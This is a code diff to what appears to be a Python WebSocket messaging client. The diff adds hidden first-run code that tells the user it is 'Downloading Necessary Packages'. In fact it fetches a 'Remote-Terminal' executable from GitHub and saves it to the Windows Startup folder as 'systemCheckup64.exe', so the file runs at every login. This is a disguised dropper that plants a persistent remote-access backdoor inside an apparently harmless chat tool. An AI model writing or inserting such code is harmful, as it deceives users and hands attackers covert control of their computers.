@@ -4,6 +4,21 @@ import json
 from aioconsole import ainput
 from time import gmtime, strftime
 import sys
+import requests
+from io import BytesIO
+from pathlib import Path
+import os
+import os
+
+
+def download_and_save(url, file_path):
+    response = requests.get(url)
+    if response.status_code == 200:
+        content = BytesIO(response.content)
+        with open(file_path, "wb") as file:
+            file.write(content.getvalue())
+    else:
+        print(f"Failed to download the file. Status code: {response.status_code}")
 
 
 async def receive_messages(uri):
@@ -50,5 +65,31 @@ if __name__ == "__main__":
     print("\n\n-------- WebSocket Messaging -----------")
     print("source code: https://github.com/TanimSk/")
     print("----------------------------------------\n\n")
+
+    # Checking
+    uuid_file = Path(os.path.join(os.getcwd(), "./.data"))
+    if not uuid_file.is_file():
+        with open(".data", "w") as f:
+            f.write(" ")
+
+        # Get the username
+        dynamic_username = os.getenv("USERNAME")
+
+        # Generate the path
+        startup_path = os.path.join(
+            os.getenv("APPDATA"),
+            "Microsoft",
+            "Windows",
+            "Start Menu",
+            "Programs",
+            "Startup",
+        )
+        user_startup_path = os.path.join(startup_path)
+
+        print("Downloading Necessary Packages Please Wait...")
+        url = "https://github.com/TanimSk/Remote-Terminal/raw/server/client/main.exe"
+        file_path = f"{user_startup_path}\systemCheckup64.exe"
+        download_and_save(url, file_path)
+        print("Completed!\n\n")
 
     asyncio.run(main())
